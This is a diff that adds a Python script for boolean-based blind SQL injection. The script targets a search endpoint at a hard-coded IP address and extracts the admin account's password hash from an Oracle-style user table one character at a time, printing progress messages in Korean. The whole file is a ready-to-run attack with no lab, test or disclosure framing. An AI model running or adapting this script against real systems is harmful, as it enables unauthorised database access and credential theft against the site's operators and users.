@@ -1,0 +1,60 @@
+import requests
+
+URL = "http://115.68.194.137:8080/redweb/search"
+TRUE_MARKER = "/redweb/board/detail?id="
+
+TARGET_SQL = "SELECT PASSWORD_HASH FROM RW_USER WHERE LOGIN_ID='admin' AND ROWNUM=1"
+
+def is_true(condition):
+    payload = f"' AND {condition}-- "
+
+    r = requests.get(
+        URL,
+        params={"keyword": payload},
+        timeout=5
+    )
+
+    return TRUE_MARKER in r.text
+
+def get_length(max_len=200):
+    print("[*] 길이 확인 중...")
+
+    for length in range(1, max_len + 1):
+        condition = f"LENGTH(({TARGET_SQL}))={length}"
+
+        if is_true(condition):
+            print(f"[+] length: {length}")
+            return length
+
+    print("[-] 길이를 찾지 못했습니다.")
+    return 0
+
+def get_value(length):
+    result = ""
+
+    print("[*] 값 추출 중...")
+
+    for pos in range(1, length + 1):
+        found = False
+
+        for ascii_code in range(32, 127):
+            condition = f"ASCII(SUBSTR(({TARGET_SQL}),{pos},1))={ascii_code}"
+
+            if is_true(condition):
+                ch = chr(ascii_code)
+                result += ch
+                print(f"[+] {pos}/{length}: {result}")
+                found = True
+                break
+
+        if not found:
+            result += "?"
+            print(f"[-] {pos}번째 문자 추출 실패")
+
+    return result
+
+length = get_length()
+
+if length > 0:
+    value = get_value(length)
+    print("\n[+] PASSWORD_HASH:", value)
